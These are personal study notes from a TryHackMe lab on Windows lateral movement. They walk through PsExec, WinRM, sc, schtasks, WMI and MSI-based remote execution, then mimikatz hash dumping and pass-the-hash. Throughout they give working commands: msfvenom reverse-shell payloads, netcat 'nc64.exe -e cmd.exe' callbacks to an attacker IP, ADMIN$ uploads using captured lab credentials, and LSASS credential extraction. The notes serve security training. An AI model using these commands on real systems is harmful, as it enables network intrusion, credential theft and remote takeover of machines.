# Introduction

- In this room, we will look at lateral movement, a group of techniques used by attackers to move around the network while creating as few alerts as possible.
- We'll learn about several common techniques used in the wild for this end and the tools involved.


### Learning Objectives

- Familiarize yourself with the lateral movement techniques used by attackers.
- Learn how to use alternative authentication material to move laterally.
- Learn different methods to use compromised hosts as pivots.


## Connecting to the Network

**AttackBox**  

If you are using the Web-based AttackBox, you will be connected to the network automatically if you start the AttackBox from the room's page. You can verify this by running the ping command against the IP of the THMDC.za.tryhackme.com host. We do still need to configure DNS, however. Windows Networks use the Domain Name Service (DNS) to resolve hostnames to IPs. Throughout this network, DNS will be used for the tasks. You will have to configure DNS on the host on which you are running the VPN connection. In order to configure our DNS, run the following command:

Terminal
```
[thm@thm]$ systemd-resolve --interface lateralmovement --set-dns $THMDCIP --set-domain za.tryhackme.com
```

- Remember to replace `$THMDCIP` with the IP of THMDC in your network diagram.

- You can test that DNS is working by running:

```bash
$ nslookup thmdc.za.tryhackme.com
```

This should resolve to the IP of your DC.

**Note: DNS may be reset on the AttackBox roughly every 3 hours. If this occurs, you will have to restart the systemd-resolved service. If your AttackBox terminates and you continue with the room at a later stage, you will have to redo all the DNS steps.**  

You should also take the time to make note of your VPN IP. Using `ifconfig` or `ip a`, make note of the IP of the **lateralmovement** network adapter. This is your IP and the associated interface that you should use when performing the attacks in the tasks.


## Requesting Your Credentials

To simulate an AD breach, you will be provided with your first set of AD credentials. Once your networking setup has been completed, on your Attack Box, navigate to `[http://distributor.za.tryhackme.com/creds](http://distributor.za.tryhackme.com/creds)` to request your credential pair. Click the "Get Credentials" button to receive your credential pair that can be used for initial access.

This credential pair will provide you SSH access to `THMJMP2.za.tryhackme.com`. THMJMP2 can be seen as a jump host into this environment, simulating a foothold that you have achieved.Â 

For SSH access, you can use the following command:

`ssh za\\<AD Username>@thmjmp2.za.tryhackme.com`

## A Note on Reverse Shells

If you are using the AttackBox and have joined other network rooms before, be sure to select the IP address assigned to the tunnel interface facing the `lateralmovementandpivoting` network as your `ATTACKER_IP`, or else your reverse shells/connections won't work properly. For your convenience, the interface attached to this network is called `lateralmovement`, so you should be able to get the right IP address by running `ip add show lateralmovement`:

This will be helpful whenever needing to do a reverse connection back to your attacker machine throughout the room.

# Moving through the Network

### What is Lateral Movement?

- Simply put, lateral movement is the group of techniques used by attackers to move around a network.
- Once an attacker has gained access to the first machine of a network, moving is essential for many reasons, including the following:

		- Reaching our goals as attackers []
		- Bypassing network restrictions in place []
		- Establishing additional points of entry to the network []
		- Creating confusion and avoid detection []

- While many **cyber kill chains** reference lateral movement as an additional step on a linear process, it is actually a `part of a cycle`.
- During this cycle, we use any available credentials to perform lateral movement, giving us access to new machines where we elevate privileges and extract credentials as possible.
- With the newfound credentials, the cycle starts again.

![](/assets/img/Pasted image 20230205005751.png)


- Usually, we will repeat this cycle several times before reaching our final goal on the network.
- If our first foothold is a machine with very little acces to other network resources, we might need to move laterally to other hosts that have more privileges on the network.


### A quick example

- Suppose we are performing a red team engagement where our ***final goal is to reach an internal code repository***, where we got our first compromise on the target network by using a `phishing campaign`.
- Usually, phishing campaigns are more effective against non-technical users, so our first access might be through a machine in the `Marketing department`.


- `Marketing workstations` will typically be limited through firewall policies to access any critical services on the network, including `admin protocols`, `database ports`, `monitoring services` or any other that aren't required for their day to day labour, including code repositories.

		- Basically, obviously the marketing workstations won't have direct access to anything that is directly related to compromising the internal code repository but we can still use them as a foothold.

- To reach sensitive `hosts` and `services`, we need to move to other hosts and pivot from there to our final goal.
- To this end, we could try elevating privileges on the `Marketing workstation` and `extracting local users' password hashes`.
- If we find a local administrator, the same account may be present on other hosts.
- After doing some recon, we find a workstation with the name `DEV-001-PC`.
- We use the local administrator's password hash to access `DEV-001-PC` and confirm that it is owned by one of the developers in the company.
- From there, access to our target code repository is available.

![](/assets/img/Pasted image 20230205010510.png)


- Notice that while lateral movement might need to be used to circumvent firewall restrictions, it is also helpful in evading detection.
- In our example, even if the `Marketing workstation` had direct access to the code repository, it is probably desirable to connect through the developer's PC.
- This behaviour would be less suspicious from the standpoint of a blue team analyst checking login audit logs.


### The Attacker's Perspective

- While performing most of the lateral movement techniques introduced throughout the room, **we will mainly use admin credentials**.
- While one might expect that every single admin account would serve the same purpose, a distinction has to be made between `two types of admins`:

		1. Local accounts part of the local Adminstrators group
		2. Domain accounts part of the local Administrators group

- The differences we are interested in are restrictions imposed by `User Account Control(UAC)` over local administrators (except for the default Administrator account).

***NOTE: By default, local administrators won't be able to remotely connect to a machine and perform admin tasks unless using an interactive session through RDP***.

- Windows will **deny any admin task** requested via `RPC`, `SMB` or WinRM `since` such administrators will be logged in with a filtered medium integrity token, preventing the account from doing privileged actions.

		- Remember from UAC Bypass room that this is a defensive mechanism so local admin users aren't allowed to execute remote code with high privileges limiting possible attackers control on a compromised account/system.

- The only local account that will get **full privileges** is the `default Administrator` account.
- This security feature can be disabled if desired, and sometimes you will find no difference between local and domain accounts in the administrator's group.
- Still, its essential to keep in mind that should some of the lateral movement techniques fail, it might be due to using a non-default local administrator where UAC is enforced.
- More about this security feature here: `https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction`

# Spawning Process Remotely

<u>Capability</u>:

- This task will look at the available methods an attacker has to do to `spawn a process remotely`.

<u>Pre-requisites</u>:

- This allows them to run commands on machines where they have valid credentials.

<u>Variant</u>:

- Each of the techniques discussed uses slightly different ways to achieve the same purpose, and some of them might be a better fit for some specific scenarios.


### PSExec

		- Ports: 445/TCP (SMB)
		- Required Group Memberships: Administrators

- `Psexec` has been the go-to method when needing to execute processes remotely for years.
- It allows an administrator user to run commands remotely on any PC where he has access.
- `Psexec` is one of many `Sysinternals Tools` and can be downloaded here: `https://docs.microsoft.com/en-us/sysinternals/downloads/psexec`


- The way `psexec` works is as follows:

		1. Connect to "Admin$" share and upload a service binary. Psexec uses "psexesvc.exe" as the name.
		2. Connect to the service control manager (SCM) to create and run a service names PSEXESVC and associate the service binary with C:\Windows\psexesvc.exe.
		3. Create some named pipes to handle "stdin/stdout/stderr".

<u>Modelling</u>:

![](/assets/img/Pasted image 20230205012140.png)


##### Step 1: Running `psexec`
- We need to supply the required administrator credentials for the remote host and the command we want to run (`psexec64.exe` is available under `C:\Tools` in `THMJMP2` for your convenience)

```powershell
> psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```


### Remote Process Creation using WinRM

	- Ports: 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
	- Required Group Memberships: Remote Management Users

- **Windows Remote Management (WinRM)** is a web-based protocol used to send `PowerShell` commands to Windows hosts `remotely`.
- Most Windows Server installations will have WinRM enabled by default, making it an attractive attack vector.

##### Step 2: Connecting to a remote PowerShell session from the command line

```powershell
> winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
```


##### Step 3: Doing the same but using `PowerShell` but to pass different credentials, we will need to create a `PSCredential` object

```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

##### Step 4: Creating an interactive session using the `Enter-PSSession` cmdlet after having `PSCredential` object

```powershell
> Enter-PSSession -Computername TARGET -Credential $credential
```

##### Step 5: PowerShell also includes the `Invoke-Command` cmdlet which runs `ScriptBlocks` remotely via `WinRM`
- Credentials must be passed through a `PSCredential` object as well:

```powershell
> Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```


### Remotely Creating Services using `sc`

	- Ports:
			- 135/TCP, 49152-65535 (DCE/RPC)
			- 445/TCP (RPC over SMB Named Pipes)
			- 139/TCP (RPC over SMB Named Pipes)
	- Required Group Memberships: Administrators

- ***Windows services*** can also be leveraged to run arbitrary commands since they execute a command when started.
- While a service executable is technically different from a regular application, if we configure a Windows service to run any app, it will still execute it and fail afterwards.

		- Recall the Windows Persistence room (I think?)
		- They have used a bunch of 'sc' commands in there.

- We can create a service on a remote host with `sc.exe`, a standard tool available in Windows.
- When using `sc`, it will try to connect to the `Service Control Manager (SVCCTL) remote service program` through RPC in several ways: 

		1. A connection attempt will be made using "DCE/RPC". The client will first connect to the "Endpoint Mapper (EPM)" at port 135, which serves as a catalogue of available RPC endpoints and request information on the SVCCTL service program. The EPM will then respond with the IP and port to connect to SVCCTL, which is usually a dynamic port in the range of "49152-65535".

![](/assets/img/Pasted image 20230205202416.png)

	2. If the latter connection fails, 'sc' will try to reach SVCCTL through SMB named pipes, either on port 445 (SMB) or 139 (SMB over NetBIOS).

![](/assets/img/Pasted image 20230205202547.png)

- With the connection establish between the client and the server, the client can now create a `service` on the server's machine remotely as you can see with the steps below.

		- Okay, so basically what the connection to either SVCCTL or SMB is bind connection so that the client can remotely execute comands on the server's system (or whatever is serving the SMB and/or SVCCTL).

##### Step 1: Creating a service using `sc` utility
- We can create and start a service named "`THMservice`" using the following commands:

```powershell
> sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
> sc.exe \\TARGET start THMservice
```

- The "`net user`" command will be executed when the service is started, creating a new local user on the system.
- Since the OS is in charge of starting the service, you won't be able to look at the command output.

##### Step 2: Stop and Delete a service for cleanup

```powershell
> sc.exe \\TARGET stop THMservice
> sc.exe \\TARGET delete THMservice
```

	- Question: How exactly can we use services to move laterally on the network? What are the steps done in doing so?


### Creating Scheduled Tasks `Remotely`

- Another Windows feature we can use is `Scheduled Tasks`.
- You can create and run one remotely with `schtasks`, available in any Windows installation.
- To create a task anmed `THMtask1`, we can use the following commands:

```powershell
> schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 

> schtasks /s TARGET /run /TN "THMtask1" 
```

	Breakdown:
	- "/sc ONCE" : which means the task is intended to be run only once at the specified time and date.
	- "/sd" : sets the starting date
	- "/st" : sets the starting time
	- "/tr" : the command to execute (tr == task run)
	- "/tn" : name of the task


- Since the system will run the scheduled task, the command's output won't be available to us, making this a blind attack.

##### Deleting a scheduled task for cleanup

```powershell
> schtasks /S TARGET /TN "THMtask1" /DELETE /F
```



### Let's Get to Work

**Network Topology Recap**:

![](/assets/img/Pasted image 20230205204522.png)

- To complete this exercise, you will need to connect to `THMJMP2` using the credentials assigned to you in Task 1 from `http://distributor.za.tryhackme.com/creds`
- If you haven't done so yet, click on the link and get credentials now.
- Once you have your creds, connect to `THMJMP2` via SSH:

```bash
$ ssh za\\<AD Username>@thmjmp2.za.tryhackme.com
```

- For this exercise, we will assume we have already captured some credentials with `administrative access`:

```
User:Â ZA.TRYHACKME.COM\t1_leonard.summers
Password:Â EZpass4ever
```

	- When logging in SSH, only use the "t1_leonard.summers" to place in the placeholder "<AD Username>" in the command above.

- We'll show how to use those credentials to move laterally to `THMIIS` using `sc.exe`.
- Feel free to try the other methods, as they all should work against `THMIIS`.


- While we have already shown how to use `sc` to create a user on a remote system (by using `net user`), we can also upload any binary we'd like to execute and associate it with the created service.
- However, if we try to run a `reverse shell` using this method, we will notice that the ***reverse shell disconnects immediately after execution***.

		- Reason: Service executables are different to standard ".exe" files, and therefore non-service executables will end up being killed by the Service Manager almost immediately.
		- Okay, so the presumption is "Service Manager" has a list of legitimate service executables.
		- If that is the case, would it be possible for us to create a malicious version of whatever service we are imitating and then provide an absolute path instead so it doesn't mistakenly execute the legitimate service nor kill this malicious version?

- Luckily for us, `msfvenom` supports the `exe-service` format, which will encapsulate any payload we like inside a fully functional service executable, preventing it from getting killed.

**Note**: since you will be sharing lab with others, you'll want to use a different filename for your payload instead of "`myservice.exe`" to avoid overwriting someone else's payload.

##### Creating a `Reverse Shell` that is compatible with the service created that is listening for the connection coming from `THMIIS` machine (Main Target)
- To create a reverse shell, we can use the following command:

```bash
user@AttackBox$ msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=<ATTACKER_IP> LPORT=4444 -o myservice.exe
```

<u>In the VM</u>:

```bash
root@ip-10-10-128-189:~# msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.49.2 LPORT=4444 -o dopedope.exe
```

![](/assets/img/Pasted image 20230205220709.png)

###### NOTE: USE THE IP (`INET`) IN HERE as your ATTACKER_IP
```
lateralmovement: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
inet 10.50.49.2  netmask 255.255.255.0  destination 10.50.49.2
inet6 fe80::3bbb:a46d:421a:1a2b  prefixlen 64  scopeid 0x20<link>
unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 100
```


##### Installation of malware/payload part:
- We will then proceed to use `t1_leonard.summers` credentials to upload our payload to the `ADMIN$` share of `THMIIS` using `smbclient` from our **AttackBox**:

```bash
user@AttackBox$ smbclient -c 'put dopedope.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
 putting file myservice.exe as \myservice.exe (0.0 kb/s) (average 0.0 kb/s)
```

	- Seems like from the AttackBox, we are able to upload binary files on the THMIIS machine which we want to move laterally in from THMJMP2.

- Note that the payload will be at `C:\Windows\` directory. I forgot to check it once I got the Metasploit reverse shell.

<u>In the VM</u>:

![](/assets/img/Pasted image 20230205221209.png)

- Once our executable is uploaded, we will set up a listener on the attacker's machine to receive the reverse shell from `msfconsole`:

```bash
user@AttackBox$ msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set LHOST lateralmovement
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
msf6 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 10.10.10.16:4444
```


- Alternatively, you can run the following one-liner on your Linux console to do the same:

```bash
user@AttackBox$ msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444;exploit"
```


- Since `sc.exe` doesn't allow us to specify credentials as part of the command , we need to use `runas` to spawn a new shell with `t1_leonard.summers`'s access token.
- Still, we only have SSH access to the machine, so if we tried something like `runas /netonly /user:ZA\t1_leonard.summers cmd.exe`, the new command prompt would spawn on the user's session, but ***we would have no access to it***.

![](/assets/img/Pasted image 20230205222456.png)

	- On the left hand side, you can't see the `Flag.exe` at all.
	- This is because the 2nd one is on the THMJMP2 machine while the right hand side is on the THMIIS machine.

<u>In the VM</u>:

![](/assets/img/Pasted image 20230205221444.png)

##### Creating reverse shell connection from `THMJMP2` machine:
- To overcome this problem, we can use `runas` to spawn a **second netcat reverse shell** with `t1_leonard.summers` access token:

```powershell
C:\> runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe 10.50.49.2 4443"
```

**Note: Remember that since you are using `runas` with the `/netonly` option, it will not bother to check if the provided credentials are valid (more info on this on the `Enumerating AD room`), so be sure to type the password correctly. If you don't, you will see some `ACCESS DENIED` errors later in this room.**

- We can receive the `reverse shell` connection using `nc` in our AttackBox:

```bash
user@AttackBox$ nc -lvp 4443
```

<u>In the VM</u>:

![](/assets/img/Pasted image 20230205221703.png)

	- Got the shell.


##### And finally, proceed to create a new service remotely by using `sc`, associating it with our uploaded binary:
**Format**:

```shell-session
C:\> sc.exe \\thmiis.za.tryhackme.com create <service_name> binPath= "%windir%\<uploaded-bin>.exe" start= auto
C:\> sc.exe \\thmiis.za.tryhackme.com start <service_name>
```

		- Remember to create a variant of the Service Names since many users are also using that!

**Actual**:

```powershell
C:\> sc.exe \\thmiis.za.tryhackme.com create THMservice-DANGER binPath= "%windir%\dopedope.exe" start= auto
```

<u>In the VM</u>:

![](/assets/img/Pasted image 20230205221928.png)

	- View on the other reverse shell (the one with Ncat.exe)

```powershell
C:\> sc.exe \\thmiis.za.tryhackme.com start THMservice-DANGER
```

<u>In the VM</u>:

![](/assets/img/Pasted image 20230205222029.png)

	- Okay, so basically, we created and started the service from the THMJMP2 machine (1st machine to jump from).

##### Checking the msfconsole handler exploit:

![](/assets/img/Pasted image 20230205222055.png)

	- Got the 2nd reverse shell session!
	- Note that this is a cmd.exe reverse shell not a Meterpreter one as stated from the `msfvenom` payload.

![](/assets/img/Pasted image 20230205222158.png)

- Be sure to change the name of your service to avoid clashing with other students.

- Once you have started the service, you should receive a connection in your **AttackBox** from where you can access the first flag on `t1_leonard.summers` desktop.

### Getting the flag:

![](/assets/img/Pasted image 20230205222248.png)

### Stop and Delete a service for cleanup from the `THMIIS` machine (2nd machine that we jumped to)

```powershell
> sc.exe \\thmiis.za.tryhackme.com stop THMservice-DANGER
> sc.exe \\thmiis.za.tryhackme.com delete THMservice-DANGER
```

	- After getting what we want from THMIIS machine, we can cleanup and remove the malicious service that made the reverse shell from it possible.

![](/assets/img/Pasted image 20230205224933.png)

	- Now, the malicious service is deleted.

<u>The Metasploit Reverse Shell</u>:

![](/assets/img/Pasted image 20230205224959.png)

	- It is still here!
	- This is because the process running the service is still running but the service got deleted already.

### Summary/Conclusion

- This shows that you don't have the access token of `t1_leonard.summers` because of the UAC protection mechanism that prevents high-level access token to be given on remote access. Here's the proof:

![](/assets/img/Pasted image 20230205222629.png)

	- On the left hand side, it has the downgraded access token while on the right hand side, the 2nd reverse shell has the access token of the user t1_leonard.summers!

- Isn't this more like a `privilege escalation`?

		- No, what you just accomplished is that from THMJMP2 machine, you moved laterally to machine THMIIS which Tier 1 admin like leonard.summers actually have to log in on.
		- But yea, I guess in one way, this seems a combination of privilege escalation and lateral movement as we managed to fully utilize the power of the compromised T1 Admin credential and moved on to use this on a different machine in which that credential would have its full power on.
		- You as the attacker moving laterally onto THMIIS machine ALLOWS privilege escalation with the compromised credential.

- Things to keep track of:

		- 1st reverse shell (netcat) => THMJMP2 machine connected to our AttackBox.
		- 2nd reverse shell (metasploit) => Connected from THMIIS machine to our AttackBox.


---------

# Moving Laterally Using `WMI`

- We can also perform many techniques discussed in the previous task differently by using `Windows Management Instrumentation` (WMI).
- `WMI` is Windows implementation of Web-Based Enterprise Management(WBEM).

		- an enterprise standard for accessing management information across devices.
		- It allows Administrators to perform standard management tasks that attackers can abuse to perform lateral movement in various ways, which we'll discuss.


### Connecting to WMI From PowerShell

- Before being able to connect to `WMI` using PowerShell commands, we need to create a `PSCredential` object with our user and password.
- This object will be stored in the `$credential` variable and utilized throughout the techniques on this task:

```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

- We then proceed to establish a `WMI` session using either of the following protocols:

- `DCOM` : **RPC over IP** will be used for connecting to WMI. This protocol uses `port 135/TCP` and `ports 49152-65535/TCP`, just as explained when using `sc.exe`.
- `Wsman`: **WinRM** will be used for connecting to `WMI`. This protocol uses `ports 5985/TCP` (WinRM HTTP) or `port 5986/TCP` (WinRM HTTPS).


##### Step 1: Establishing a `WMI` session from PowerShell
- To establish a `WMI` session from PowerShell, we can use the following commands and store the session on the `$Session` variable, which we will use throughout the room on the different techniques:

```powershell
> $Opt = New-CimSessionOption -Protocol DCOM
> $Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

- The `New-CimSessionOption` cmdlet is used to configure the connection options for the `WMI` session, including the connection protocol.
- The **options** and **credentials** are then passed to the `New-CimSession` cmdlet to establish a sessions against a remote host.



### Remote Process Creation Using WMI

- Ports :

		- 135/TCP, 49152-65535/TCP (DCERPC)
		- 5985/TCP (WinRM HTTP) or 5986/TCP(WinRM HTTPS)

- Required Group Memberships: `Administrators`

- We can remotely spawn a process from PowerShell by leveraging **Windows Management Instrumentation (WMI)**, sending a WMI request to the `Win32_Process` classto spawn the process under the session we created before:

```powershell
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}
```


- Notice that `WMI` won't allow you to see the output of any command but will indeed create the required process silently.

- On legacy systems, the same can be done using `wmic` from the command prompt:

```powershell
> wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe" 
```


### Creating Services Remotely with `WMI`

- Ports:

		- 135/TCP, 49152-65535/TCP (DCERPC)
		- 5985/TCP, (WinRM HTTP) or 5986/TCP(WinRM HTTPS)

- Required Group Memberships: `Administrators`

##### Creating services with `WMI` through PowerShell

```powershell
> Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
	Name = "THMService2";
	DisplayName = "THMService2";
	PathName = "net user munra2 Pass123 /add"; # Your payload
	ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
	StartMode = "Manual"
}
```


- And then, we can get handle on the service and start it with the following commands:

```powershell
> $Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"

> Invoke-CimMethod -InputObject $Service -MethodName StartService
```

- Finally, we can `stop` and `delete` with the following commands:

```powershell
> Invoke-CimMethod -InputObject $Service -MethodName StopService
> Invoke-CimMethod -InputObject $Service -MethodName Delete
```



### Creating Scheduled Tasks Remotely with `WMI`

- Ports:

		- 135/TCP, 49152-65535/TCP (DCERPC)
		- 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)

- Required Group Memberships: `Administrators`

##### We can create and execute scheduled tasks by using some cmdlets available in Windows default installations:

```powershell
# Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```


##### To delete the scheduled task after it has been used:

```powershell
> Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```


### Installing MSI packages through WMI

-   **Ports:**
    -   135/TCP, 49152-65535/TCP (DCERPC)
    -   5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
-   **Required Group Memberships:** Administrators

- `MSI` is a file format used for installers.
- If we can copy an MSI package to the target system, we can then use `WMI` to attempt to install it for us.
- The file can be copied in any way available to the attacker.
- Once the `MSI` file is in the target system, we can attempt to install it by invoking the `Win32_Product` class through `WMI`:

```powershell
> Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```


##### Using `wmic` in Legacy systems to do the same thing:

```powershell
> wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
```



### Application

- To complete this exercise, you will need to connect to `THMJMP2` using the credentials assigned to you on Task 1 from `http://distributor.za.tryhackme.com/creds`.

- If you haven't done so yet, click on the link and get credentials. Once you have your credentials, connect to THMJMP2 via SSH:

<u>Format</u>:

```bash
$ ssh za\\<AD Username>@thmjmp2.za.tryhackme.com
```

- For this exercise, we will assume we have already captured some credentials with **administrative access**:

**User:**Â `ZA.TRYHACKME.COM\t1_corine.waters`

**Password:**Â `Korine.1994`

- We'll show how to use those credentials to move laterally to ***THM-IIS*** using WMI and MSI packages. Feel free to try the other methods presented during this task.

<u>Actual</u>:

```bash
$ ssh za\\t1_corine.waters`@thmjmp2.za.tryhackme.com
```


##### Step 1: Creating `MSI` payload with `msfvenom`:

```shell
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.50.49.2 LPORT=4445 -f msi > DANGERZONE.msi
```

- `Lateral movement IP` : `10.50.49.2`

<u>Output in the VM</u>:

![](/assets/img/Pasted image 20230205233522.png)

##### Step 2: Copy the payload using `SMB` (or any other method)

```bash
user@AttackBox$ smbclient -c 'put DANGERZONE.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
 putting file myinstaller.msi as \myinstaller.msi (0.0 kb/s) (average 0.0 kb/s)
```

![](/assets/img/Pasted image 20230205233629.png)

- Since we copied our payload to the `ADMIN$` share , it will be available at `C:\Windows\` on the server.

##### Step 3: Start a handler to receive the reverse shell from `Metasploit`

```PowerShell
msf6 exploit(multi/handler) > set LHOST lateralmovement
msf6 exploit(multi/handler) > set LPORT 4445
msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
msf6 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 10.10.10.16:4445
```

![](/assets/img/Pasted image 20230205234334.png)

##### Step 4: Starting a `WMI` session against `THMIIS` from a `PowerShell` console: (This code is executed at `THMJMP2` machine)

```PowerShell
PS C:\> $username = 't1_corine.waters';
PS C:\> $password = 'Korine.1994';
PS C:\> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
PS C:\> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
PS C:\> $Opt = New-CimSessionOption -Protocol DCOM
PS C:\> $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
```


##### Step 5: Invoke the `install` method from the `Win32_Product` class to trigger the payload: (this is executed at the `THMJMP2` machine)

```powershell
PS C:\> Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\DANGERZONE.msi"; Options = ""; AllUsers = $false}
```


**Output**:

![](/assets/img/Pasted image 20230205234651.png)

	- As you can see on the right, the reverse shell is received by Metasploit!

![](/assets/img/Pasted image 20230205234738.png)

	- This is indeed the THMIIS machine using the compromised admin credentials!

### Getting the Flag:

![](/assets/img/Pasted image 20230205234858.png)


### NOTE: Create Modelling diagram of how exactly does the payload we uploaded prior gets triggered.

-------
# Use of Alternate Authentication Material

- By alternate authentication material, we refer to any piece of data that can be used to access a Windows account ***without*** actually knowing a user's password itself.
- This is possible because of some authentication protocols used by Windows networks work.
- In this task, we will take a look at a couple of alternatives available to log as a user when either of the following authentication protocols is available on the network:

		- NTLM Authentication
		- Kerberos Authentication

- **Note** : During this task , you are assumed to be familiar with the methods and tools to extract credentials from a host.  `Mimikatz` will be used as the tool of choice for credential extraction throughout the room.


### NTLM Authentication

- Before diving into the actual lateral movement techniques, let's take a look at how NTLM authentication works:

![](/assets/img/Pasted image 20230208155541.png)

	Ultra High-level breakdown:
	- Basically, the Client asks the Server for the Challenge.
	- Once the server sent the challenge to the user, the Client then answers with a Response.
	- This Response+Challenge is then forwarded from Server to Domain Controller which has the actual Response given by the Server to the Client.
	- Once the Domain Controller accepts the response+challenge sent by the Client forwarded by the server to the Domain Controller, it compares whether the Response is correct given the challenge given by Server to Client.

	"Lower" High-Level breakdown:
	1. The client sends an authentication request to the server they want to access.
	2. The server generates a random number and sends it as a challenge to the client.
	3. The client combines his NTLM password hash with the challenge (and other known data) to generate a response to the challenge and sends it back to the server for verification.
	4. The server forwards both the challenge and the response to the Domain Controller for verification.
	5. The domain controller uses the challenge to RECALCULATE the response and compares it to the initial response sent by the client. If they both match, the client is authenticated; otherwise, access is denied. The authentication result is sent back to the server.
	6. The server forwards the authentication result to the client.


- **Note** : The described process applies when using a `domain account`. If a local account is used, the server can verify the response to the challenge itself without requiring interaction with the domain controller since it has the password hash stored locally on its SAM.

		- Local Account = Doesn't Server doesn't notify the DC for NTLM AUthentication
		- Domain Account = DC is notified by the server for NTLM authentication


### Pass-The-**Hash** - `Attack on NTLM Authentication`

- As a result of extracting credentials from a host where we have ***attained admin privileges*** (by using `mimikatz` or other tools), we might get clear-text passwords or hashes that can be easily cracked.
- However, if we aren't lucky enough, we will end up with ***non-cracked NTLM password*** hashes.

		- Clear-text & cracked hashes passwords == Compromised host with admin privileges
		- Otherwise, non-cracked NTLM password hashes.

- Although it may seem we can't really use those hashes, the NTLM challenge sent during authentication can be responded to just by knowing the password hash.
- This means we can authenticate without requiring the plaintext password to be known.
- Instead of having to crack NTLM hashes, if the Windows domain is configured to use NTLM authentication, we can `Pass-The-Hash(PtH)` and authenticate successfully.

		- Condition for Pass-The-Hash attack:
		- The Windows Domain must have NTLM authentication enabled.

- To extract NTLM hashes, we can either use `mimikatz`  to read the `local SAM` or extract hashes directly from `LSASS` memory.

##### Step 1: Extracting NTLM hashes from `local SAM`:

- This method will ***only allow you to get hashes from local users on the machine***.
- No domain user's hashes will be available.

```powershell
mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # lsadump::sam   
RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 145e02c50333951f71d13c245d352b50
```


##### Step 2: Extracting NTLM hashes from LSASS memory:

```powershell
mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # sekurlsa::msv 
Authentication Id : 0 ; 308124 (00000000:0004b39c)
Session           : RemoteInteractive from 2 
User Name         : bob.jenkins
Domain            : ZA
Logon Server      : THMDC
Logon Time        : 2022/04/22 09:55:02
SID               : S-1-5-21-3330634377-1326264276-632209373-4605
        msv :
         [00000003] Primary
         * Username : bob.jenkins
         * Domain   : ZA
         * NTLM     : 6b4a57f67805a663c818106dc0648484
```


##### Step 3: Performing `Pass-the-Hash` attack using `mimikatz` to inject an access token for the victim user on a reverse shell (or any other command you like) as follows:

```powershell
mimikatz # token::revert
mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
```

	Breakdown:
	- "token::revert" : to reestablish our original token privileges, as trying to "pass-the-hash" with an elevated token won't work.
	- this is equivalent to "runas /netonly" but with a hash instead of a password and will spawn a new reverse shell from where we can launch any command as the victim user.

##### Step 4: Receiving the reverse shell:

```bash
user@AttackBox$ nc -lvp 5555
```

